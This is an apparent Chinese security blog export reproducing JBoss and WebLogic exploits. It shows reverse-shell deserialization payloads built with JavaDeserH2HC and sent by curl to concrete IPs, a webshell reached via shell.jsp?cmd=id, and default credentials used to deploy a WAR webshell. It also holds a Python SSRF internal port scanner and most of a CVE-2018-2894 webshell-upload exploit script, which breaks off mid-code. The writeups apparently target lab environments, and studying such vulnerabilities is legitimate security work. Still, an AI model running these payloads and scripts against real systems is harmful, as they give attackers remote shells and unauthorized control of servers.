Chrome/120.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,la;q=0.8,en;q=0.7<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>主需要修改head 和后面的参数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114164016718.png" alt="image-20240114164016718"></p><p>之后访问指定的路径就可以了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114164157123.png" alt="image-20240114164157123"></p><blockquote><p><a href="http://target.yijinglab.com:54677/jmx-console/shell.jsp?cmd=id">http://target.yijinglab.com:54677/jmx-console/shell.jsp?cmd=id</a></p></blockquote><h1 id="CVE-2015-7501"><a href="#CVE-2015-7501" class="headerlink" title="CVE-2015-7501"></a>CVE-2015-7501</h1><p>  JMXInvokerServlet 反序列化漏洞  </p><h2 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  CVE-2015-7501，JBoss 在&#x2F;invoker&#x2F;JMXInvokerServlet 请求中读取了用户传入的对象，然后我  们可以利用 Apache  Commons Collections 中的 Gadget 执行任意代码 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器  中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，JBoss在&#x2F;invoker&#x2F;JMXInvokerServlet 请求中读取了用户传入的对象，从而导致了漏洞。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>  访问 <a href="http://ip:port/invoker/JMXInvokerServlet，返回如下的response，说明接口是开放的，此接口存在漏洞">http://ip:port/invoker/JMXInvokerServlet，返回如下的response，说明接口是开放的，此接口存在漏洞</a></p><h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li><p>下载反序列化生成的工具</p><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/joaomatosf/JavaDeserH2HC.git<br></code></pre></td></tr></table></figure></blockquote></li></ol><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">javac -cp .<span class="hljs-symbol">:commons-collections-</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>.jar <span class="hljs-title class_">ReverseShellCommonsCollectionsHashMap</span>.java<br>java -cp .<span class="hljs-symbol">:commons-collections-</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>.jar <span class="hljs-title class_">ReverseShellCommonsCollectionsHashMap</span> <span class="hljs-number">124.71</span>.<span class="hljs-number">45.28</span><span class="hljs-symbol">:</span><span class="hljs-number">1212</span><br></code></pre></td></tr></table></figure><p>   然后监听</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114201343602.png" alt="image-20240114201343602"></p><p>   然后</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>xx.xx.xx.xx:<span class="hljs-number">8080</span><span class="hljs-regexp">/invoker/</span>JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<br></code></pre></td></tr></table></figure><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/jboss%E6%BC%8F%E6%B4%9E/image-20240114201352463.png" alt="image-20240114201352463"></p><p>正常反弹</p><h1 id="CVE-2017-7504"><a href="#CVE-2017-7504" class="headerlink" title="CVE-2017-7504"></a>CVE-2017-7504</h1><blockquote><p>  JBossMQ JMS 反序列化漏洞  </p></blockquote><h2 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>  JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS  over HTTP Invocation Layer的  HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏  洞执行任意代码。  </p><p>  CVE-2017-7504漏洞与CVE-2015-7501的漏洞原理相似，只是利用的路径稍微出现了变化，CVE-  2017-7504出现在&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet路径下。JBoss AS 4.x及之前版本中，  JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在  </p><p>反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码</p></blockquote><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>  JBoss AS 4.x及之前版本  </p></blockquote><h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><blockquote><p>  访问<a href="http://47.104.255.11:60080/jbossmq-httpil/HTTPServerILServlet%EF%BC%8C%E8%8B%A5%E5%87%BA%E7%8E%B0%E5%A6%82%E4%B8%8B%E7%95%8C%E9%9D%A2%E5%88%99%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E">http://47.104.255.11:60080/jbossmq-httpil/HTTPServerILServlet，若出现如下界面则存在漏洞</a></p></blockquote><h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>和上面一样的，只是接口不一样</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joaomatosf/</span>JavaDeserH2HC.git<br>cd JavaDeserH2HC<br></code></pre></td></tr></table></figure><p>  使用nc打开端口监听，再用之前生成的.ser文件，通过POST二进制数据上去，使用nc监听端口，即  可拿到shell  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//i</span>p:port<span class="hljs-regexp">/jbossmq-httpil/</span>HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<br></code></pre></td></tr></table></figure><h1 id="CVE-2017-12149"><a href="#CVE-2017-12149" class="headerlink" title="CVE-2017-12149"></a>CVE-2017-12149</h1><blockquote><p>  Jboss Application Server反序列化命令执行漏洞  </p></blockquote><h2 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>  JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未  经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。  </p><p>  该漏洞为 Java反序列化错误类型，存在于 Jboss的 HttpInvoker组件中的  ReadOnlyAccessFilter过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反  序列化，从而导致了漏洞。  </p><p>  首先需要了解Java的序列化和反序列化。Java序列化就是指把Java对象转换为字节序列的过程，在传  递和保存对象时.保证对象的完整性和可传递性。对象转换为有序字节流,以便在网络上传输或者保存在  本地文件中。Java反序列化就是指把字节序列恢复为Java对象的过程，根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。</p></blockquote><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>  JBoss 5.x -  6.x  </p></blockquote><h2 id="漏洞发现-2"><a href="#漏洞发现-2" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><blockquote><p>  访问<a href="http://ip:port/invoker/readonly，若返回如下显示状态码为500的报错界面,则证明漏洞存在">http://ip:port/invoker/readonly，若返回如下显示状态码为500的报错界面,则证明漏洞存在</a></p></blockquote><p>这个比较特殊</p><h2 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">javac -cp .<span class="hljs-symbol">:commons-collections-</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>.jar <span class="hljs-title class_">ReverseShellCommonsCollectionsHashMap</span>.java<br>java -cp .<span class="hljs-symbol">:commons-collections-</span><span class="hljs-number">3.2</span>.<span class="hljs-number">1</span>.jar <span class="hljs-title class_">ReverseShellCommonsCollectionsHashMap</span> <span class="hljs-number">120.27</span>.<span class="hljs-number">61.239</span><span class="hljs-symbol">:</span><span class="hljs-number">4444</span><br><br></code></pre></td></tr></table></figure><p>然后反弹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">47.104</span>.<span class="hljs-number">255.11</span>:<span class="hljs-number">60080</span><span class="hljs-regexp">/invoker/</span>readonly --data-binary @ReverseShellCom<br>monsCollectionsHashMap.ser<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic中间件漏洞</title>
    <link href="/2024/01/13/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/01/13/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="中间件简绍"><a href="#中间件简绍" class="headerlink" title="中间件简绍"></a>中间件简绍</h1><h2 id="常见的中间件"><a href="#常见的中间件" class="headerlink" title="常见的中间件"></a>常见的中间件</h2><blockquote><p>apache</p><p>nginx</p><p>iis</p><p>tomcat</p><p>weblogic</p><p>jboss</p></blockquote><p>作用是：让一台计算机有处理网站的能力</p><p>weblogic  javaee中间件（我们国家使用这个的频率很高，而且很多大厂每年争这个漏洞）</p><p>jboss javaee中间件</p><h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>  WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间  件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部  署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java  Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。  </p></blockquote><p>javaee就是java的企业版</p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><blockquote><p>默认端口：7001</p><p>控制后台：<a href="http://ip:7001/console">http://ip:7001/console</a></p></blockquote><p>通过404判断是否是Weblogic</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113115011675.png" alt="image-20240113115011675"></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p><a href="https://www.freebuf.com/vuls/369272.html">WebLogic全系漏洞分析截至20230612-上 - FreeBuf网络安全行业门户</a></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ol><li><p>fofa</p><blockquote><p>  fofa：app&#x3D;”BEA-WebLogic-Server” &amp;&amp;  country!&#x3D;”CN”  </p></blockquote><p>默认端口是7001</p></li><li><p>批量漏洞扫描</p><blockquote><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><p>  <a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p></blockquote></li></ol><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>  <a href="https://github.com/vulhub/vulhub/tree/master/weblogic">https://github.com/vulhub/vulhub/tree/master/weblogic</a>  </p><h1 id="历史漏洞复现"><a href="#历史漏洞复现" class="headerlink" title="历史漏洞复现"></a>历史漏洞复现</h1><h2 id="WeakPassword"><a href="#WeakPassword" class="headerlink" title="WeakPassword"></a>WeakPassword</h2><blockquote><p>Weblogic存在管理后台，通过账号密码登录，由于管理员的疏忽，经常会使用弱口令，或者默认的户名密码</p></blockquote><h3 id="相关弱口令"><a href="#相关弱口令" class="headerlink" title="相关弱口令"></a>相关弱口令</h3><blockquote><p>  <a href="https://cirt.net/passwords?criteria=weblogic">https://cirt.net/passwords?criteria=weblogic</a>  </p></blockquote><blockquote><p>  账号：weblogic  密码：Oracle@123  </p></blockquote><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ol><li><p>先使用蚁剑生成一个jsp木马</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113201720374.png" alt="image-20240113201720374"></p><p>保存为jsp，然后使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jar -cvf x.war x.jsp<br></code></pre></td></tr></table></figure></li><li><p>然后登录console后台</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113201900409.png" alt="image-20240113201900409"></p></li><li><p>上载文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113201932094.png" alt="image-20240113201932094"></p><p>后面就一直下一步就可以了</p></li><li><p>最后完成</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113202045465.png" alt="image-20240113202045465"></p></li><li><p>上传成功之后，访问</p><p>路径为：</p><blockquote><p>war包名（不带war）&#x2F;jsp名（要带jsp）</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113202211304.png" alt="image-20240113202211304"></p></li><li><p>使用蚁剑连接就行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113202248644.png" alt="image-20240113202248644"></p></li></ol><h1 id="CVE-2014-4210"><a href="#CVE-2014-4210" class="headerlink" title="CVE-2014-4210"></a>CVE-2014-4210</h1><p>这个漏洞是一个ssrf 漏洞</p><h2 id="简绍"><a href="#简绍" class="headerlink" title="简绍"></a>简绍</h2><p>  Weblogic 中存在一个 SSRF 漏洞，利用该漏洞可以发送任意HTTP请求，进而可以攻 击内网中Redis、Fastcgi 等脆弱组件</p><p>  漏洞产生于 <strong>&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp</strong> 页面中，可以导致 SSRF，用来攻击内网  中一些redis和fastcgi之类的脆弱组件   </p><h2 id="内网存活探测脚本"><a href="#内网存活探测脚本" class="headerlink" title="内网存活探测脚本"></a>内网存活探测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> contextlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://122.114.225.18:4012/uddiexplorer/SearchPublicRegistries.jsp&quot;</span><br><br>ports = [<span class="hljs-number">6378</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">22</span>,<span class="hljs-number">25</span>,<span class="hljs-number">80</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">7002</span>]<br><br><span class="hljs-keyword">for</span> i, port <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>), ports):<br>    params = <span class="hljs-built_in">dict</span>(<br>        rdoSearch=<span class="hljs-string">&quot;name&quot;</span>,<br>        txtSearchname=<span class="hljs-string">&quot;sdf&quot;</span>,<br>        selfor=<span class="hljs-string">&quot;Business+location&quot;</span>,<br>        btnSubmit=<span class="hljs-string">&quot;Search&quot;</span>,<br>        operator=<span class="hljs-string">f&quot;http://172.19.0.<span class="hljs-subst">&#123;i&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>,<br>    )<br>    <span class="hljs-keyword">with</span> contextlib.suppress(Exception):<br>        r = requests.get(url, params=params, timeout = <span class="hljs-number">3</span>)<br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;could not connect over HTTP to server&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;No route to host&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*] http://172.19.0.<span class="hljs-subst">&#123;i&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="题外话：获取公网IP"><a href="#题外话：获取公网IP" class="headerlink" title="题外话：获取公网IP"></a>题外话：获取公网IP</h1><blockquote><p>curl cip.cc</p></blockquote><h1 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>在Weblogic Web Service Test Page中存在一处任意文件上传漏洞，Web Service Test Page  在”生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意 jsp 文件，进而获取  服务器权限。  </p></blockquote><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用vulhub里面的</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> traceback<br><span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_current_work_path</span>(<span class="hljs-params">host</span>):<br>    geturl = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;host&#125;</span>/ws_utc/resources/setting/options/general&quot;</span><br>    ua = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&#x27;</span>&#125;<br>    values = []<br>    <span class="hljs-keyword">try</span>:<br>        request = requests.get(geturl)<br>        <span class="hljs-keyword">if</span> request.status_code == <span class="hljs-number">404</span>:<br>            exit(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;host&#125;</span>  don&#x27;t exists CVE-2018-2894&quot;</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;Deploying Application&quot;</span>.lower() <span class="hljs-keyword">in</span> request.text.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] First Deploying Website Please wait a moment ...&quot;</span>)<br>            time.sleep(<span class="hljs-number">20</span>)<br>            request = requests.get(geturl, headers=ua)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;/defaultValue&gt;&quot;</span> <span class="hljs-keyword">in</span> request.content.decode():<br>            root = ET.fromstring(request.content)<br>            value = root.find(<span class="hljs-string">&quot;section&quot;</span>).find(<span class="hljs-string">&quot;options&quot;</span>)<br>            <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> value:<br>                values.extend(<br>                    sub.text<br>                    <span class="hljs-keyword">for</span> sub <span class="hljs-keyword">in</span> e<br>                    <span class="hljs-keyword">if</span> e.tag == <span class="hljs-string">&quot;parameter&quot;</span> <span class="hljs-keyword">and</span> sub.tag == <span class="hljs-string">&quot;defaultValue&quot;</span><br>                )<br>    <span class="hljs-keyword">except</span> requests.ConnectionError:<br>        exit(<span class="hljs-string">f&quot;[-] Cannot connect url: <span class="hljs-subst">&#123;geturl&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> values:<br>        <span class="hljs-keyword">return</span> values[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Cannot get current work path\n&quot;</span>)<br>    exit(request.content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_new_work_path</span>(<span class="hljs-params">host</span>):<br>    origin_work_path = get_current_work_path(host)<br>    works = <span class="hljs-string">&quot;/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;user_projects&quot;</span> <span class="hljs-keyword">in</span> origin_work_path:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;\\&quot;</span> <span class="hljs-keyword">in</span> origin_work_path:<br>            works = works.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>)<br>            current_work_home = origin_work_path[:origin_work_path.find(<span class="hljs-string">&quot;user_projects&quot;</span>)] + <span class="hljs-string">&quot;user_projects\\domains&quot;</span><br>            dir_len = <span class="hljs-built_in">len</span>(current_work_home.split(<span class="hljs-string">&quot;\\&quot;</span>))<br>            domain_name = origin_work_path.split(<span class="hljs-string">&quot;\\&quot;</span>)[dir_len]<br>            current_work_home += <span class="hljs-string">&quot;\\&quot;</span> + domain_name + works<br>        <span class="hljs-keyword">else</span>:<br>            current_work_home = origin_work_path[:origin_work_path.find(<span class="hljs-string">&quot;user_projects&quot;</span>)] + <span class="hljs-string">&quot;user_projects/domains&quot;</span><br>            dir_len = <span class="hljs-built_in">len</span>(current_work_home.split(<span class="hljs-string">&quot;/&quot;</span>))<br>            domain_name = origin_work_path.split(<span class="hljs-string">&quot;/&quot;</span>)[dir_len]<br>            current_work_home += <span class="hljs-string">f&quot;/<span class="hljs-subst">&#123;domain_name&#125;</span><span class="hljs-subst">&#123;works&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        current_work_home = origin_work_path<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] cannot handle current work home dir: <span class="hljs-subst">&#123;current_work_home&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> current_work_home<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_new_upload_path</span>(<span class="hljs-params">host, path</span>):<br>    data = &#123;<br>        <span class="hljs-string">&quot;setting_id&quot;</span>: <span class="hljs-string">&quot;general&quot;</span>,<br>        <span class="hljs-string">&quot;BasicConfigOptions.workDir&quot;</span>: path,<br>        <span class="hljs-string">&quot;BasicConfigOptions.proxyHost&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;BasicConfigOptions.proxyPort&quot;</span>: <span class="hljs-string">&quot;80&quot;</span>&#125;<br>    request = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;host&#125;</span>/ws_utc/resources/setting/options&quot;</span>, data=data, headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;successfully&quot;</span> <span class="hljs-keyword">in</span> request.content.decode():<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Change New Upload Path failed&quot;</span>)<br>    exit(request.content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_webshell</span>(<span class="hljs-params">host, uri</span>):<br>    set_new_upload_path(host, get_new_work_path(host))<br>    files = &#123;<br>        <span class="hljs-string">&quot;ks_edit_mode&quot;</span>: <span class="hljs-string">&quot;false&quot;</span>,<br>        <span class="hljs-string">&quot;ks_password_front&quot;</span>: password,<br>        <span class="hljs-string">&quot;ks_password_changed&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>        <span class="hljs-string">&quot;ks_filename&quot;</span>: (<span class="hljs-string">&quot;test.jsp&quot;</span>, upload_content)<br>    &#125;<br><br>    request = requests.post(host + uri, files=files)<br>    response = request.text<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := re.findall(<span class="hljs-string">&quot;&lt;id&gt;(.*?)&lt;/id&gt;&quot;</span>, response):<br>        tid = <span class="hljs-keyword">match</span>[-<span class="hljs-number">1</span>]<br>        shell_path = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;host&#125;</span>/ws_utc/css/config/keystore/<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(tid)&#125;</span>_test.jsp&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-keyword">in</span> requests.get(shell_path, headers=headers).content.decode():<br>            <span class="hljs-built_in">print</span>(<span 